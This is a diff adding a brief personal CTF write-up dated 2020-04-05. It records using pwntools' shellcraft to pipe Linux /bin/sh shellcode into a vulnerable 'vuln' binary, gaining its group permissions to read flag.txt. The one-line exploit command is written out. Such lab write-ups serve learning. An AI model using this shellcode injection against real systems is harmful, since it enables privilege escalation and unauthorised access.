@@ -1,0 +1,11 @@
+20200405
+Followed a John Hammond video for this one.
+
+Introduced to the Python library 'pwn', specifically pwn.shellcraft for crafting shell code.
+
+Command line code for this challenge:
+(python -c "import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))" ; cat) | ./vuln
+
+This piped the printed output from Python into the 'vuln' file, while leaving standard
+input open, meaning our gid changed to reflect where the shell was open. This allowed
+cat flag.txt to be executed because we now had permissions.
